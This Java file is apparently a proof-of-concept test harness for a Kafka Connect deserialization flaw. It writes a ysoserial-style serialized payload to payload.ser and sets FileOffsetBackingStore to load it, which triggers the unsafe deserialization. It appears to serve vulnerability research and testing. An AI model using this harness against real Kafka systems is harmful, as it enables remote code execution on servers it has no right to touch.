package com.unionpay.kafka.test.common;

import org.apache.commons.io.FileUtils;
import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;
import org.apache.kafka.connect.storage.FileOffsetBackingStore;
import ysoserial.payloads.Jdk7u21;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * date: 2017/09/13 15:38.
 * author: Yueqi Shi
 */
public abstract class AbstractMain {
    public void test_Kafka_Deser() throws Exception {

        StandaloneConfig config;

        String projectDir = System.getProperty("user.dir");

        Object o = this.getObject();

        byte[] ser = serialize(o);

        File tempFile = new File(projectDir + "/payload.ser");
        FileUtils.writeByteArrayToFile(tempFile, ser);

        Map<String, String> props = new HashMap<String, String>();
        props.put(StandaloneConfig.OFFSET_STORAGE_FILE_FILENAME_CONFIG,
                tempFile.getAbsolutePath());
        props.put(StandaloneConfig.KEY_CONVERTER_CLASS_CONFIG,
                "org.apache.kafka.connect.json.JsonConverter");
        props.put(StandaloneConfig.VALUE_CONVERTER_CLASS_CONFIG,
                "org.apache.kafka.connect.json.JsonConverter");
        props.put(StandaloneConfig.INTERNAL_KEY_CONVERTER_CLASS_CONFIG,
                "org.apache.kafka.connect.json.JsonConverter");
        props.put(StandaloneConfig.INTERNAL_VALUE_CONVERTER_CLASS_CONFIG,
                "org.apache.kafka.connect.json.JsonConverter");
        config = new StandaloneConfig(props);

        FileOffsetBackingStore restore = new FileOffsetBackingStore();
        restore.configure(config);
        restore.start();
    }

    public abstract Object getObject() throws Exception;

    protected byte[] serialize(Object object) throws IOException {
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bout);
        out.writeObject(object);
        out.flush();
        return bout.toByteArray();
    }
}
